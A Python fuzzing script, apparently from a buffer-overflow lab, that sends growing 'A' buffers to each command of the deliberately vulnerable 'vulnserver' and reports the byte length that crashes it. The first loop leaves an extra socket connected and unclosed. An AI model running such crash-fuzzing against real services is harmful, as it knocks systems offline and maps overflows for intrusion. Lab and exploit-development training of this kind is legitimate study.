#!/usr/bin/env python3
import socket, time, sys

ip = "MACHINE_IP"
port = 9999
timeout = 5


prefixes = [b'STATS ', b'RTIME ', b'LTIME ', b'SRUN ', b'TRUN ', b'GMON ', \
            b'GDOG ', b'KSTET ', b'GTER ', b'HTER ', b'LTER ', b'KSTAN ']

fix = b'/.:/'
fixfix = '/.:/'

buffer = []
counter = 100
while len(buffer) < 99:
    buffer.append(b'A' * counter)
    counter += 100

results = {}

for prefix in prefixes:
    stringfix = str(prefix, 'utf-8')[:-1]
    print('FUZZING {}'.format(stringfix))
    for string in buffer:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            connect = s.connect((ip, port))
            s.recv(1024)
            s.send(prefix + string + b'\r\n')
            s.recv(1024)
            s.close()
            time.sleep(.01)
        except:
            results[stringfix] = len(string)
            input('Restart vulnserver and press enter')
            break
    try:
        if results[stringfix]:
            time.sleep(.01)
    except KeyError:
        print('Additional fuzzing with {} {}'.format(stringfix, fixfix))
        for string in buffer:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                connect = s.connect((ip, port))
                s.recv(1024)
                s.send(prefix + fix + string + b'\r\n') #find additional vulns
                s.recv(1024)
                s.close()
                time.sleep(.01)
            except:
                s.close()
                results[stringfix + ' ' + fixfix] = len(string)
                input('Restart vulnserver and press enter')
                break
for key in results:
    print('Command {} crashed after {} bytes'.format(key, results[key]))
sys.exit(0)
